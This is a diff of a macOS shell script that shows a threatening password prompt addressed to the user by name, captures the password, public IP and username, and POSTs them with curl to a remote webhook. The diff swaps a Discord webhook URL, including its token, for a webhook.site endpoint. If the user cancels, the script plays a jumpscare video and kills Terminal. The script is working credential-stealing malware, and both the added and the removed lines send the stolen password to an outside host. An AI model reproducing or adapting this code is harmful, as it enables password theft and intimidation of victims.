@@ -5,7 +5,7 @@
 #     "I know where you live, [FirstName]."
 #     "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
 # - If a non-empty password is entered, it sends the password, public IP,
-#   and username to a Discord webhook using Ruby for JSON generation.
+#   and username to your custom HTTP endpoint (Webhook.site) using Ruby for JSON generation.
 # - If the user cancels (or leaves the password empty), it downloads and plays
 #   a jumpscare video (from GitHub) in Safari (full-screen, at max volume).
 # - Finally, it force-kills Terminal.
@@ -113,7 +113,7 @@ EOF
     killall Terminal
     exit 0
 else
-    # User provided a password – proceed to send data to Discord.
+    # User provided a password – proceed to send data to your HTTP endpoint.
     echo "Password entered: $password"
     capture="${capture}password=${password}\n"
     
@@ -132,9 +132,9 @@ else
         payload=$(printf '{"content": "%s"}' "$json_content")
     fi
     
-    # --- Send Payload to Discord Webhook ---
-    DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139736552570900/GsKXFNHTYx7Ej7D36VnzpotosTaIhxZk4Qb9SMySCM052SQ371xSdNH2Bu_oWexZkmxR"
-    curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"
+    # --- Send Payload to Custom HTTP Endpoint (Webhook.site) ---
+    CUSTOM_ENDPOINT="https://webhook.site/41aa5760-13a8-429c-8443-82d078c7859b"
+    curl -X POST -H "Content-Type: application/json" -d "$payload" "$CUSTOM_ENDPOINT"
     rm /tmp/pass.txt
     
     # --- Force Kill Terminal ---
